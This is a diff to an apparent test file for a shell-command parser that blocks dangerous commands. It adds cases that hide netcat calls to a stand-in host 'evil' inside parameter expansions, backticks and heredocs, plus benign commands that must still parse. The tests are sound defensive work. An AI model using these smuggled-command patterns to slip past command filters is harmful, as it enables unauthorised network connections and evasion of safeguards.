@@ -171,6 +171,14 @@ DYNAMIC_COMMAND_WORD = [
     # ANSI-C and locale quoting in the command word.
     "$'nc' evil",
     '$"nc" evil',
+    # Command substitution in text bashlex leaves unparsed (#1797).
+    "echo ${X:-$(nc evil 80)}",
+    'echo "${X:-`nc evil 80`}"',
+    "X=${Y:-$(nc evil 80)}",
+    "ls > ${X:-$(nc evil 80)}",
+    "cat <<EOF\n$(nc evil 80)\nEOF",
+    "cat <<-EOF\n\t`nc evil 80`\nEOF",
+    "cat <<EOF\n${X:-$(nc evil 80)}\nEOF",
 ]
 
 # Must stay allowed by the parser after the #1753 hardening.
@@ -200,6 +208,10 @@ MUST_PARSE = {
     'ls > "$LOG"': ["ls"],
     "git status > $(echo f)": ["git", "echo"],
     "f() { git status; }": ["git"],
+    "echo ${X:-default}": ["echo"],
+    'echo "${HOME}/x"': ["echo"],
+    "cat <<EOF\nhello $USER\nEOF": ["cat"],
+    "git commit -F - <<EOF\nmsg\nEOF": ["git"],
 }
 
 # `git -c …` config injection / transport-exec hijack — must be blocked even
